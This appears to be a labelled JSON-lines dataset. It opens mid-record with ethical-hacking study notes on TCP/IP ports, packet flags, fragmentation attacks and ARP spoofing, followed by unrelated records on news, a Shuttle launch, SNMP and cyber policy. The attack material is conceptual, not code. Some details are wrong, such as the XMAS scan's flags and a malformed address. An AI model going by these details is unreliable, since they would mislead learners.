port. The primary reason services have assigned ports is so that a client can easily find that service on a remote host. As an example, FTP servers listen at port 21, and Hypertext Transfer Protocol (HTTP) servers listen at port 80. Client applications, such as a File Transfer Protocol (FTP) program or browser, use randomly assigned ports typically greater than 1023.\nThere are approximately 65,000 ports; they are divided into well-known ports (0Ė1023), registered ports (1024Ė49151), and dynamic ports (49152Ė65535). Although there are hundreds of ports and corresponding applications in practice, less than a hundred are in common use. The most common of these are shown in Table 2.1. These are some of the ports that a hacker would look for first on a victimís computer systems.\nTABLE 2.1 Common Ports and Protocols\nPort Service Protocol 21 FTP TCP 22 SSH TCP 23 Telnet TCP 25 SMTP TCP 53 DNS TCP/UDP 67/68 DHCP UDP 69 TFTP UDP 79 Finger TCP 80 HTTP TCP 88 Kerberos UDP 110 POP3 TCP 111 SUNRPC TCP/UDP 135 MS RPC TCP/UDP 139 NB Session TCP/UDP 161 SNMP UDP 162 SNMP Trap UDP 389 LDAP TCP 443 SSL TCP 445 SMB over IP TCP/UDP 1433 MS-SQL TCP\nThe following list discusses the operation and security issues of some of the common applications:\nFile Transfer Protocol (FTP)\nFTP is a TCP service and operates on ports 20 and 21. This application is used to move files from one computer to another. Port 20 is used for the data stream and transfers the data between the client and the server. Port 21 is the control stream and is used to pass commands between the client and the FTP server. Attacks on FTP target misconfigured directory permissions and compromised or sniffed clear-text passwords. FTP is one of the most commonly hacked services.Telnet\nTelnet is a TCP service that operates on port 23. Telnet enables a client at one site to establish a session with a host at another site. The program passes the information typed at the clientís keyboard to the host computer system. Although Telnet can be configured to allow anonymous connections, it should be configured to require usernames and passwords. Unfortunately, even then, Telnet sends them in clear text. When a user is logged in, he or she can perform any allowed task. Applications, such as Secure Shell (SSH), should be considered as a replacement. SSH is a secure replacement for Telnet and does not pass cleartext username and passwords.Simple Mail Transfer Protocol (SMTP)\nThis application is a TCP service that operates on port 25. It is designed for the exchange of electronic mail between networked systems. Messages sent through SMTP have two parts: an address header and the message text. All types of computers can exchange messages with SMTP. Spoofing and spamming are two of the vulnerabilities associated with SMTP.Domain Name Service (DNS)\nThis application operates on port 53 and performs address translation. Although we sometimes realize the role DNS plays, it serves a critical function in that it converts fully qualified domain names (FQDNs) into a numeric IP address or IP addresses into FQDNs. If someone were to bring down DNS, the Internet would continue to function, but it would require that Internet users know the IP address of every site they want to visit. For all practical purposes, the Internet would not be useable without DNS.The DNS database consists of one or more zone files. Each zone is a collection of structured resource records. Common record types include the Start of Authority(SOA) record, A record, CNAME record, NS record, PTR record, and the MX record. There is only one SOA record in each zone database file. It describes the zone name space. The A record is the most common, as it contains IP addresses and names of specific hosts. The CNAME record is an alias. For example, the outlaw William H. Bonney went by the alias of Billy the Kid. The NS record lists the IP address of other name servers. An MX recordis a mail exchange record. This record has the IP address of the server where email should be delivered. Hackers can target DNS servers with many types of attacks. One such attack is DNS cache poisoning. This type of attack sends fake entries to a DNS server to corrupt the information stored there. DNS can also be susceptible to DoS attacks and to unauthorized zone transfers. DNS uses UDP for DNS queries and TCP for zone transfers.\nTrivial File Transfer Protocol (TFTP)\nTFTP operates on port 69. It is considered a down-and-dirty version of FTP as it uses UDP to cut down on overhead. It not only does so without the session management offered by TCP, but it also requires no authentication, which could pose a big security risk. It is used to transfer router configuration files and by cable companies to configure cable modems. TFTP is a favorite of hackers and has been used by programs, such as the Nimda worm, to move data without having to use input usernames or passwords.Hypertext Transfer Protocol (HTTP)\nHTTP is a TCP service that operates on port 80. This is one of the most well-known applications. HTTP has helped make the Web the popular protocol it is today. The HTTP connection model is known as a stateless connection. HTTP uses a request response protocol in which a client sends a request and a server sends a response. Attacks that exploit HTTP can target the server, browser, or scripts that run on the browser. Code Red is an example of code that targeted a web server.Simple Network Management Protocol(SNMP)\nSNMP is a UDP service and operates on ports 161 and 162. It was envisioned to be an efficient and inexpensive way to monitor networks. The SNMP protocol allows agents to gather information, including network statistics, and report back to their management stations. Most large corporations have implemented some type of SNMP management. Some of the security problems that plague SNMP are caused by the fact that community strings can be passed as clear text and that the default community strings (public/private) are well known. SNMP version 3 is the most current, and it offers encryption for more robust security.TIP\nA basic understanding of these applicationsí strengths and weaknesses will be needed for the exam.\nDescribe the TCP packet structure\nKnow the TCP flags and their meaning\nUnderstand how UDP differs from TCP\nThe host-to-host layer provides end-to-end delivery. Two primary protocols are located at the host-to-host layer, which includes Transmission Control Protocol (TCP) and User Datagram Protocol (UDP).\nTCP enables two hosts to establish a connection and exchange data reliably. To do this, TCP performs a three-step handshake before data is sent. During the data-transmission process, TCP guarantees delivery of data by using sequence and acknowledgment numbers. At the completion of the data-transmission process, TCP performs a four-step shutdown that gracefully concludes the session. The startup and shutdown sequences are shown in Figure 2.4.\nTCP has a fixed packet structure that is used to provide flow control, maintain reliable communication, and ensure that any missing data is resent. At the heart of TCP is a 1-byte flag field. Flags help control the TCP process. Common flags include synchronize (SYN), acknowledgement (ACK), push (PSH), and finish (FIN). Figure 2.5 details the TCP packet structure. TCP security issues include TCP sequence number attacks, session hijacking, and SYN flood attacks. Programs, such as Nmap, manipulate TCP flags to attempt to identify active hosts.\nThe ports shown previously in Table 2.1 identify the source and target application, whereas the sequence and acknowledgement numbers are used to assemble packets into their proper order. The flags are used to manage TCP sessionsófor example, the synchronize (SYN) and acknowledge (ACK) flags are used in the three-way handshaking, whereas the reset (RST) and finish (FIN) flags are used to tear down a connection. FIN is used during a normal four-step shutdown, whereas RST is used to signal the end of an abnormal session. The checksum is used to ensure that the data is correct, although an attacker can alter a TCP packet and the checksum to make it appear valid. Other flags include urgent (URG). If no flags are set at all, the flags can be referred to as Null, as none are set.\nNot all hacking tools play by the rules; most port scanners can tweak TCP flags and send them in packets that should not normally exist in an attempt to illicit a response for the victimís server. One such variation is the XMAS tree scan, which sets the SYN, URG, and PSH flags. Another is the NULL scan, which sets no flags in the TCP header.\nUDP performs none of the handshaking processes that we see performed with TCP. Although that makes it considerably less reliable than TCP, it does offer the benefit of speed. It is ideally suited for data that requires fast delivery and is not sensitive to packet loss. UDP is used by services such as DHCP and DNS. UDP is easier to spoof by attackers than TCP as it does not use sequence and acknowledgement numbers. Figure 2.6 shows the packet structure of UDP.\nDescribe how Internet Control Message Protocol (ICMP) functions and its purpose\nThe Internet layer contains two important protocols: Internet Protocol (IP) and Internet Control Messaging Protocol (ICMP). IP is a routable protocol whose function is to make a best effort at delivery. The IP header is shown in Figure 2.7. Spend a few minutes reviewing it to better understand each fieldís purpose and structure. While reviewing the structure of UDP, TCP, and IP, packets might not be the most exciting part of security work. A basic understanding is desirable because many attacks are based on manipulation of the packets. For example, the total length field and fragmentation is tweaked in a ping of death attack.\nIP addresses are laid out in a dotted decimal notation format. IPv4 lays out addresses into a four decimal number format that is separated by decimal points. Each of these decimal numbers is one byte in length to allow numbers to range from 0Ė255. Table 2.2 shows IPv4 addresses and the number of available networks and hosts.\nTABLE 2.2 Ipv4 Addressing\nAddress Class | Address Range | Number of Networks | Number of Hosts A 1-126 126 16,777,214 B 128-191 16,384 65,534 C 192-223 2,097152 254 D 224-239 NA NA E 240-255 NA NA\nTABLE 2.3 Private Address Ranges\nAddress Class Address Range Default Subnet Mask A 10.0.0.0 - 10.255.255.255.255 255.0.0.0 B 172.16.0.0 - 172.31.255.255 255.255.0.0 C 192.168.0.0 - 192.168.255.255 255.255.255.0\nSource routing was designed to allow individuals the ability to specify the route that a packet should take through a network. It allows the user to bypass network problems or congestion. IPís source routing informs routers not to use their normal routes for delivery of the packet but to send it via the router identified in the packetís header. This lets a hacker use another systemís IP address and get packets returned to him regardless of what routes are in between him and the destination. This type of attack can be used if the victimís web server is protected by an access list based on source addresses. If the hacker were to simply spoof one of the permitted source addresses, traffic would never be returned to him. By spoofing an address and setting the loose source routing option to force the response to return to the hackerís network, the attack might succeed. The best defense against this type of attack is to block loose source routing and not respond to packets set with this option.\nIf IP must send a datagram larger than allowed by the network access layer that it uses, the datagram must be divided into smaller packets. Not all network topologies can handle the same datagram size; therefore, fragmentation is an important function. As IP packets pass through routers, IP reads the acceptable size for the network access layer. If the existing datagram is too large, IP performs fragmentation and divides the datagram into two or more packets. Each packet is labeled with a length, an offset, and a more bit. The length specifies the total length of the fragment, the offset specifies the distance from the first byte of the original datagram, and the more bit is used to indicate if the fragment has more to follow or if it is the last in the series of fragments. An example is shown in Figure 2.8.\nThe first fragment has an offset of 0 and occupies bytes 0Ė999. The second fragment has an offset of 1,000 and occupies bytes 1,000Ė1,999. The third fragment has an offset of 2,000 and occupies bytes 2,000Ė2,999, and the final fragment has an offset 3,000 and occupies bytes 3,000Ė3,599. Whereas the first three fragments have the more bit set to 1, the final fragment has the more bit set to 0 because no more fragments follow. These concepts are important to understand how various attacks function. If you are not completely comfortable with these concepts, you might want to review a general TCP/IP network book. TCP/IP Illustrated by Richard Stevens is recommended.\nOn modern networks, there should be very little fragmentation. Usually such traffic will indicate malicious activities.\nTo get a better idea of how fragmentation can be exploited by hackers, consider the following: Normally, these fragments follow the logical structured sequence as shown in Figure 2.8. Hackers can manipulate packets to cause them to overlap abnormally, as shown in Figure 2.9.\nHackers can also craft packets so that instead of overlapping, there will be gaps between various packets. These nonadjacent fragmented packets are similar to overlapping packets because they can crash or hang older operating systems that have not been patched.\nA good example of the overlapping fragmentation attack is the teardrop attack. The teardrop attack exploits overlapping IP fragment and can crash Windows 95, Windows NT, and Windows 3.1 machines.\nOne of the other protocols residing at the Internet layer is ICMP. Its purpose is to provide feedback used for diagnostics or to report logical errors. ICMP messages follow a basic format. The first byte of an ICMP header indicates the type of ICMP message. The following byte contains the code for each particular type of ICMP. The ICMP type generally defines the problem, whereas the code is provided to allow a specific reason of what the problem is. As an example, a Type 3, Code 3 ICMP means that there was a destination error and that the specific destination error is that the targeted port is unreachable. Eight of the most common ICMP types are shown in Table 2.4.\nTABLE 2.4 ICMP Types and Codes\nType Code Function 0/8 0 Echo Response/Request (Ping) 3 0-15 Destination Unreachable 4 0 Source Quench 5 0-3 Redirect 11 0-1 Time Exceeded 12 0 Parameter Fault 13/14 0 Time Stamp Request/Response 17/18 0 Subnet Mask Request/Response\nTABLE 2.5 Type 3 Codes\nCode Function 0 Net Unreachable 1 Host Unreachable 2 Protocol Unreachable 3 Port Unreachable 4 Fragmentation Needed and Don't Fragment was Set 5 Source Route Failed 6 Destination Network Unknown 7 Destination Host Unknown 8 Source Host Isolated 9 Communication with Destination Network is Administratively Prohibited 10 Communication with Destination Host is Administratively Prohibited 11 Destination Network Unreachable for Type of Service 12 Destination Host Unreachable for Type of Service 13 Communication Administratively Prohibited\nType 11 ICMP time exceeded messages are used by most traceroute programs to determine the IP addresses of intermediate routers.\nAddress Resolution Protocol (ARP) is the final protocol reviewed at the IP layer. ARPís role in the world of networking is to resolve known IP addresses to unknown MAC addresses. ARPís two-step resolution process is performed by first sending a broadcast message requesting the targetís physical address. If a device recognizes the address as its own, it issues an ARP reply containing its MAC address to the original sender. The MAC address is then placed in the ARP cache and used to address subsequent frames. You discover that hackers are interested in the ARP process as it can be manipulated to bypass the functionality of a switch. Because ARP was developed in a trusting world, bogus ARP responses are accepted as valid, which can allow attackers to redirect traffic on a switched network. Proxy ARPs can be used to extend a network and enable one device to communicate with a device on an adjunct node. ARP attacks play a role in a variety of man-in-the middle attacks, spoofing, and in-session hijack attacks.\nARP is unauthenticated and, as such, can be used for unsolicited ARP replies, for poisoning the ARP table, and for spoofing another host.\nThe network access layer is the bottom of the stack. This portion of the TCP/IP network model is responsible for the physical delivery of IP packets via frames. Ethernet is the most commonly used LAN frame type. Ethernet frames are addressed with MAC addresses that identify the source and destination device. MAC addresses are 6 bytes long and are unique to the Network Interface card (NIC) card in which they are burned. To get a better idea of what MAC addresses look like, review Figure 2.10, as it shows a packet with both the destination and source MAC addresses. Hackers can use a variety of programs to spoof MAC addresses. Spoofing MAC addresses can be a potential target to attackers attempting to bypass 802.11 wireless controls or when switches are used to control traffic by locking ports to specific MAC addresses.\nMAC addresses can be either unicast, multicast, or broadcast. Although a destination MAC address can be any one of these three types, a frame will always originate from a unicast MAC address.\nThe three types of MAC addresses can be easily identified, as follows:\nType Identified by Unicast The first byte is always an even value. Multicast The low order bit in the first byte is always on, and a multicast MAC addresses is an odd value. As an example, notice the first byte (01) of the following MAC address, 0x-01-00-0C-CC-CC-CC. Broadcast They are all binary 1s or will appear in hex as FF FF FF FF FF FF.\nThis lesson discusses the attackerís methodology, as well as some of the methodologies used by ethical hackers. Ethical hackers differ from malicious hackers in that ethical hackers seek to do no harm and work to improve an organizationís security by thinking like a hacker. This lesson also discusses the OSI model and the TCP/IP protocol suite. It looks at some of the most commonly used protocols in the suite and examines how they are used and misused by hackers. Common ports are discussed; as is the principle of deny all. Starting with all ports and protocols blocked leaves the organization in much more of a secure stance than simply blocking ports that are deemed dangerous or unneeded.\nExcercise_2.doc attached for a normal exercise\nwondex like this", "label": 1}
{"text": "November 7, 2007 By Karen Stewartson\nTraffic signals may soon be smart enough to prevent car crashes. A team of scientists at Technion-Israel Institute of Technology in Haifa, Israel, is creating such signals by connecting computers and cameras to \"stop\" and \"yield\" signs.\nWhen the cameras spot two cars approaching an intersection, the computer calculates the collision risk, then flashes warning lights on the sign to alert drivers to slow down or stop. The team's next goal is to invent a smart traffic light, which would delay a green light so an offending driver can clear an intersection without causing a crash. - Businessweek.com\nLondon is equipped with 10,000 crime-fighting closed-circuit TV cameras - which cost approximately $400 million - but doubt has been cast on their ability to help solve crime, thanks to an analysis of the publicly funded camera network.\nBy comparing the number of cameras in each London borough with the proportion of crimes solved there, researchers found that police are no more likely to catch offenders in areas with hundreds of cameras than in those with hardly any. Four out of five of the boroughs with the most cameras have a below-average record of solving crime. - Thisislondon\nCarnegie Mellon University professor Scott E. Fahlman said he was the first to use three keystrokes - a colon followed by a hyphen and a parenthesis - as a horizontal \"smiley face\" in a computer message 25 years ago.\nLanguage experts say the smiley face and other emotional icons or emoticons, have given people a concise way in e-mail and other electronic messages of expressing sentiments that otherwise would be difficult to detect.\nFahlman posted the emoticon in a message to an online bulletin board at 11:44 a.m. on Sept. 19, 1982, during a discussion about the limits of online humor and how to denote light-hearted comments. - Yahoo.com\nMobility on the Move\nAs notebooks become mainstream PC platforms throughout federal agencies, questions abound about the implications for data security. A study by the Telework Exchange, which interviewed 35 federal chief information security officers (CISOs), revealed that federal CISOs do support telework and mobility.\nCISOs were asked if laptop use has increased.\nNo 17 percent\nYes 83 percent\nCISOs were also asked if they have direct input into their agency's telework infrastructure.\nSignificant input 51 percent\nSome input 37 percent\nNo input 12 percent\nAn estimated 800,000 customer kiosks, excluding ATMs, will be installed in North America by the end of 2007 and will hit 1.2 million by 2009, according to a report by consulting firm Summit Research Associates Inc.\nA 2007 forecast showed that North American consumers would spend more than $525 billion at self-checkout lanes, ticketing kiosks and other self-service machines, including postal kiosks by the of the year. That could reach $1.3 trillion by 2011. - IHL Consulting Group\nSurfing the Net has become an obsession for many Americans. One in three adults give up friends for the Web, according to a survey of 1,011 American adults by advertising agency JWT. Conducted Sept. 7-11, 2007, the survey found that 28 percent of respondents admitted spending less time socializing face-to-face with peers because of the amount of time they spend online.\nYou may use or reference this story with attribution and a link to", "label": 1}
{"text": "Kennedy Space Center, Fla.\nAirspace, Bridges and Waterway Restrictions in Effect for All Space Shuttle Launches\nFor the STS-114 launch of Space Shuttle Discovery, NASA managers urge all aircraft pilots and boaters to comply fully with the airspace, bridges and waterway restrictions imposed around KSC prior to and during Space Shuttle launches and landings.\n\"As always, we are coordinating with officials from the Eastern Range and Federal Aviation Administration (FAA) to help provide a safe launch environment for the Shuttle crew and for interested spectators. Violating these restrictions is not only unsafe for the astronauts and support crews, it's unsafe for the violator,\" said KSC Launch Director Mike Leinbach.\nSpace Shuttle Discovery's first launch opportunity is on July 13 at 3:51 p.m. and the launch window extends for five minutes. At NASA's request, U.S. Air Force and U.S. Coast Guard surveillance aircraft will patrol KSC's airspace boundaries on launch day. Violators will be intercepted by patrol forces, thoroughly investigated and will be subject to FAA enforcement action. A number of restrictions remain in effect around the Kennedy Space Center (KSC) during the hours immediately following the launch of a Space Shuttle.\nListed and described below are restrictions that apply to pilots, motor vehicle operators and boaters utilizing airspace, bridges and waterways that lead to KSC. KSC AREA AVIATION RESTRICTIONS\nFor the launch of Space Shuttle Discovery on mission STS-114, all restricted areas surrounding the Kennedy Space Center will be active and the area covered by flight restrictions has once again been expanded for this launch. The length of time the restrictions will be in effect prior to launch has also been extended.\nDue to international terrorist activities, heightened security is essential to protect the Space Shuttle as a national asset. An inadvertent unauthorized incursion into the area of the Cape Canaveral Temporary Flight Restriction (TFR) could cause a scrub in the launch of Discovery, the activation of airspace defenses and an FAA enforcement action. Local pilots are asked to help NASA by respecting these temporary but necessary restrictions so that the launch can occur on time and without incident.\nThe restricted areas for the Kennedy Space Center and Cape Canaveral Air Force Station are in effect on a continuous basis and are limited to official aircraft only, off-limits to general aviation pilots. The restricted air space extends from the surface to but not including 14,000 feet and covers the area bounded by the Indian River to the west, Port Canaveral to the south, the city of Oak Hill to the north, and three miles over the Atlantic Ocean to the east.\nOn launch day these restricted areas will be expanded and will be activated beginning at launch minus 9 hours. On Wednesday, July 13 this occurs at 6:35 a.m. EDT and remains in effect until 6:59 p.m. EDT. Should the launch be scrubbed after the astronauts have boarded Space Shuttle Discovery, the restrictions will remain in effect for three hours after the postponement has been announced.\nFAA Part 91, Part 125, general aviation and VFR operations are prohibited within a 30 nautical mile radius of Launch Pad 39-B from the surface to but not including 18,000 feet (located on the Melbourne VOR/DME 004-degree radial at 30 nautical miles). Among the general aviation airports affected within this area are Space Coast Regional Airport in Titusville, Arthur Dunn Airpark in Titusville, Merritt Island Airport in Merritt Island, Rockledge Airpark in Rockledge and Massey Ranch in Edgewater.\nWithin an airspace radius between 30 and 40 nautical miles of Pad 39-B, a discrete transponder code must be obtained and clearance granted from air traffic control before entering this airspace. Continuous radio communications must be maintained.\nBefore flight, pilots should contact the FAA Flight Service Station at 1-800/WxBrief (1-800/992-7433) for details of the restrictions contained in the NOTAMS. In flight, outside Orlando Class B airspace, pilots should contact Daytona Beach Approach control on 134.95. In the Melbourne area contact Daytona Approach on 132.65, or in the New Smyrna Beach area on 125.35. Flight Service can also be reached locally by radio on the Titusville RCO at 123.6 or the Melbourne RCO on 122.6. Advisories will also be available from the control tower at Space Coast Regional Airport in Titusville at 118.9 megahertz.\nAmong the airports affected within the 30-40 nautical mile radius in which flight is permitted but under positive air traffic control are Orlando International Airport, Orlando Executive Airport, Orlando-Sanford International Airport, the New Smyrna Beach and Spruce Creek airports, Melbourne International Airport and Valkaria. Pilots are encouraged to consult the most recent FAA aeronautical chart for Orlando Class B air space. BRIDGES CONTROLLED FOR LAUNCH\nThe opening and closing of bridges over waterways surrounding KSC will be strictly controlled during the hours immediately before and after the launch period for each Space Shuttle mission.\nBridges affected by the launch include:\n* Canaveral Harbor Barge Canal\n(SR 401, south of Cape Canaveral Air Force Station's Gate 1);\n* Indian River Causeway West or NASA Causeway\n(Intracoastal Waterway at Addison Point);\n* Merritt Island Barge Canal\n(Merritt Island State Road 3);\n* Haulover Canal Bridge\n(State Road 3, north of KSC).\nRestraints on bridge openings for boat traffic begin three hours before launch. The bridges may be opened for five minutes at the following points in the launch countdown: T-180 minutes, T-150 minutes, T-120 minutes, T-90 minutes, and T-65 minutes. Adding 20 minutes to these times and subtracting that amount from the launch time will result in an approximate time of openings.\nBridges will remain closed to boat traffic until 90 minutes after lift-off (T+90). They may then open for five minutes at T+90, T+120 minutes and T+150 minutes. Bridge operations will return to normal three hours (T+180 minutes) after launch.\nShould the Shuttle be required to perform a Return-to-Launch-Site (RTLS) landing at KSC, all bridges would remain closed to boat traffic from 45 minutes before landing until at least one hour after landing. KSC AREA BOATING RESTRICTIONS\nWaterways and boating activities near the Kennedy Space Center will be strictly controlled prior to and during the launch of the Space Shuttle.\nSafety and security requirements, including U.S. Air Force range safety impact limit lines, will go into effect as early as three days before launch. Other requirements will be phased into effect through sunset the night before launch. A general description of the area follows: ATLANTIC OCEAN:\nBeginning noon on Sunday, July 10 through the launch, a general exclusion zone will be in effect three miles offshore from the Haulover Canal, near the north end of KSC, and southward to Port Canaveral. Four hours prior to launch, all ocean-going traffic will be restricted from entering an area measured from nine miles north and south of the launch pad and extending 64 miles east into the ocean. An additional three-mile-wide exclusion zone will be extended eastward along the flight path of the Space Shuttle. MOSQUITO LAGOON:\nThis area south of the Haulover Canal in the Mosquito Lagoon is off limits to all boats beginning the day before launch. INDIAN RIVER:\nRestrictions apply from the NASA Causeway north to the Haulover Canal and east of the Indian River's main channel. Restrictions begin at noon on Sunday, July 10. BANANA RIVER:\nSecurity limits begin at the Banana River Barge Canal south of KSC at the State Road 528 crossing and extend north. This restriction is effective roughly 16 hours prior to launch.\nAll boating restrictions will be lifted approximately one hour after launch.\nBoating interests should monitor U.S. Coast Guard Channel 16 broadcasting from Port Canaveral. The U.S. Coast Guard, the U.S. Fish and Wildlife Service, and KSC security forces share responsibility for enforcing the boating guidelines. ROAD CLOSURES:\nSpace Commerce Way which connects State Road 3 with State Road 405 (NASA Causeway) will be closed on launch day, July 13 beginning at 8 a.m. It will reopen after launch at 6 p.m. The closure is necessary due to the expected high volume of traffic on these highways.\n- end -\ntext-only version of this release\nTo receive status reports and news releases issued from the Kennedy Space Center Newsroom electronically, send a blank e-mail\nmessage to email@example.com. To unsubscribe, send\na blank e-mail message to firstname.lastname@example.org.\nThe system will confirm your request via e-mail.", "label": 1}
{"text": "domain name dispute\nA domain name dispute is a conflict that arises when more than one individual or group believes it has the right to register a specific domain name. Most commonly a domain name dispute would occur when a domain name similar to a registered trademark is registered by an individual or organization who is not the trademark owner. All domain name registrars must follow the ICANN's Uniform Domain-Name Dispute-Resolution Policy (UDRP).\nSee \"Registering a Domain Name\" and \"Understanding Internet Governance\" in the Did You Know...? section of Webopedia.\nSee also \"Countries and Their Domain Extensions\" in Webopedia's Quick Reference Section.\nFeatured Partners Sponsored\n- Increase worker productivity, enhance data security, and enjoy greater energy savings. Find out how. Download the “Ultimate Desktop Simplicity Kit” now.»\n- Find out which 10 hardware additions will help you maintain excellent service and outstanding security for you and your customers. »\n- Server virtualization is growing in popularity, but the technology for securing it lags. To protect your virtual network.»\n- Before you implement a private cloud, find out what you need to know about automated delivery, virtual sprawl, and more. »", "label": 1}
{"text": "The Simple Network Management Protocol (SNMP) has been widely used in enterprise networks to effectively manage systems, network devices, and networks. The widespread use of SNMP has raised many issues relating to managing systems and networks. One of the benefits of SNMP is how quickly solutions may be created to support the increasing numbers of networking components and applications.\nWithin SNMP networks, the number of entities (systems, components, and applications) that need to be managed is growing rapidly. There is a need to respond to the industry's demand for more flexible and dynamic management of multiple devices.\nThe initial network management solution, that is based on SNMP, allowed developers to create one monolithic agent per system/device listening on a single port (port 161). It was soon discovered that this SNMP solution had many constraints and was not flexible enough to effectively manage all the devices necessary.\nNew technology was needed to produce multiple agents by different people, that could manage different components and applications separately within a device. This resulted in the new extensible agent technology or Master/subagent technology. Based on this technology, Sun provides a solution named Solstice Enterprise Agent (SEA).\nThe agents consist of Master Agent and subagents. The Master Agent receives the SNMP-based management requests from the managers and sends responses to these management requests. The responses are sent after retrieving the appropriate values from the respective subagents. The subagents provide management of different components based on Management Information Based (MIBs or MIFs) specifically designed for components/applications.\nThe Enterprise Agent also allows you to integrate and use SNMP-based legacy agents.\nIn subsequent chapters, the roles of the Master Agent and subagents are discussed in detail.\nThe SNMP based component of the SEA product consists of various components.\nFigure 1-1 illustrates the architecture of the SEA.\nThe following is a description of each of the components associated with the SEA product.\nThe Master Agent listens on port 161.\nSubagents are zero or more processes that have access to the management information and provide manageability to various applications/components within a system. These subagents interact with the Master Agent using SNMP. These subagents do not interact with the managers directly.\nThe Software Development Toolkit has multiple components. It includes agent/subagent libraries, a MIB compiler, and example subagents. The MIB compiler parses a MIB and creates stub files. The stub files consist of functions that you modify and enhance appropriately to provide manageability of the respective component or application.\nLegacy SNMP Agents are SNMP-based and work as monolithic entities in a system. The Enterprise Agent allows the integration of legacy SNMP agents. The legacy agents are those agents already in released products from Sun or other companies.\nThe Enterprise Agent technology also allows you to integrate DMI 2.0 functionality. This is accomplished through the mapper, that acts as a subagent. The mapper receives requests from the Master Agent and converts them into appropriate DMI requests, that are then sent to the DMI Service Provider. When the mapper receives the response back from the DMI Service Provider, it converts this response into the SNMP response and forwards it to the Manager through the Master Agent.\nA subtree is indicated by a single oid. The Master Agent has no understanding of what this subtree is without any MIB specification. The subtree may actually be an entire MIB (e.g., 'host'), a full instance (e.g., hrDeviceDescr.42), or may not even be a subtree named in any MIB specification.\nDispatching is the communication of a management request from the Master Agent to one or more subagents. Dispatching is performed according to the Master Agent's current view of registered subtrees, and an explicitly stated algorithm.\nAdditional terms are described in this guide's glossary.\nThe Master Agent receives SNMP requests from the system managers and sends responses to these requests, after determining appropriate values from the subagents. The subagents provide management of different components based on the Management Information Base (MIB) specifically designed for such components/applications. Each subagent, when invoked dynamically, registers with the Master Agent. During registration, it informs the Master Agent of the MIB subtree it manages. For more information, refer to Chapter 3, SNMP-Based Master/Subagenton page 3-1.\nThe SEA technology provides a software development kit that allows you to create, release, and install subagents. Additionally, the SEA allows you to integrate and use SNMP-based legacy agents.\nThe Desktop Management Interface (DMI) is a set of interfaces and a service provider that mediate between management applications and components residing in a system.The DMI is a free-standing interface that is not tied to any particular operating system or management process.\nSun provides DMI based functionality for management of the Sun platforms (hardware and software) and software applications running on these platforms. The DMI subagent is one type of subagent included in the SEA product. By using DMI, you may manage various elements within most systems (for example, PCs, workstations, routers, hubs, and other network objects).\nA format for describing management information (MIF)\nA Service Provider entity\nTwo sets of APIs\nAn interface between management applications and the Service Provider\nAn interface between the Service Provider and component instrumentation\nA set of services (using ONC/RPC) for facilitating remote communication\nFor more information, refer to Chapter 5, Using DMI.\nThe Master Agent acts as the primary interface between the network manager and the subagents. The requests received from the manager are parsed by the Master Agent. If necessary, the original requests are broken into multiple requests. The original request is distributed by the Master Agent based on the manageability provided by each subagent. The request is then forwarded to the appropriate subagents, which provide a response to each request. After collecting all the responses from each subagent, the final response is sent to the network manager.\nOnly one Master Agent presides over the Master/subagent model. The Master Agent acts as a request scheduler and dispatcher for all subscribed subagents. In addition, the subagents send traps to the Master Agent, that are then forwarded to the manager.\nFigure 1-2 illustrates the Master Agent as it relates to the architecture of SEA.", "label": 1}
{"text": "A USB key, also known as a thumb drive or USB drive, is a kind of digital briefcase—a place to store files while you move them from one computer to another. If you’re carrying around confidential business or personal information and want to keep it safe, look for a USB key that features encryption, or scrambling, of your data and requires your PIN or password to access it.\nGovernment or business users who want to make sure an encrypted USB key is secure, however, must look carefully at how these security features work. To achieve the highest level of security, a USB key must include a dedicated security computer chip, for example a smart card chip. This tamperproof container securely stores the data encryption key and verifies your PIN/password to access the data, so it is not vulnerable to attacks on the USB key software. In addition, the key should comply with strong, military-grade encryption standards, such as the U.S. government’s Advanced Encryption Standard 256 (AES-256).\nFor example, researchers recently hacked into popular USB keys claiming to be secure. Using a flaw in the USB key software that checks your password, the researchers were able to read the data on these “secure” devices without knowing the password. More information about high security USB keys is available online.", "label": 1}
{"text": "Lessons in cyber security will now be stepped up in schools in the hope of creating a new generation of IT specialists who can counter hackers, state sponsored attacks and online criminals.\nThe country’s critical infrastructure, such as emergency services, communications, transport and utilities are also under threat because companies are not taking cyber security seriously enough, the National Audit Office report said.\nThe UK suffered 44 million cyber attacks in 2011 – the equivalent of 120,000 a day – and it is estimated to cost the country up to £27 billion a year.\nBut there is a lack of skilled people available to properly protect against such incidents, the report said.\nIt said the number of specialists in the UK has not increased in line with the growth of the internet.\nIt said the shortage of skills “hampers the UK’s ability to protect itself in cyberspace” and that the current pipeline of available talent would not meet demand.\n“Those we interviewed from academia considered that it would take up to 20 years to address the skills gap at all levels of education.”\nThe report blamed a lack of promotion of science and technology subjects at school.\nIt said the Government now “expects cyber security to be a strong strand of the future GCSE computer science syllabus”.\nThere have been concerns that the intelligence and security agencies, especially GCHQ, have struggled to attract and retain the most skilled computer specialists because they can earn far more in the private sector.\nLast year, Jonathan Evans, the director general of MI5, said the \"astonishing\" level of cyber attacks from enemy states and criminals was threatening government secrets and businesses.\nThe NAO report today warned the national infrastructure, which also includes food, health and financial services, were essential to daily life but at risk of attack.\nIt said the majority of services are privately owned and the Government has recognised that it needs to work with industry.\n“It considers, for example, that cyber security is not well understood at board level and executives have difficulty assessing the impact of cyber security risks,” it said.\nAmyas Morse, head of the NAO, said: \"The threat to cyber security is persistent and continually evolving.\n\"Business, government and the public must constantly be alert to the level of risk if they are to succeed in detecting and resisting the threat of cyber attack.\"\nThe Government's cyber strategy has already started to deliver benefits, the NAO said, with the Serious Organised Crime Agency catching more than 2.3 million compromised debit or credit cards since 2011, preventing a potential loss of more than £500 million.\nMP Margaret Hodge, chairwoman of the Public Accounts committee, said: \"The use of the internet for commerce and communication is a force for good, but it also poses new and growing threats that government, businesses and individuals cannot ignore.\n\"With around 80 per cent of the internet in private hands, crossing international boundaries and spanning different jurisdictions, the Government cannot approach internet security in isolation.\n\"Having a robust and well thought-through strategy is crucial if the Government is to respond effectively to cyber threats.\"", "label": 1}
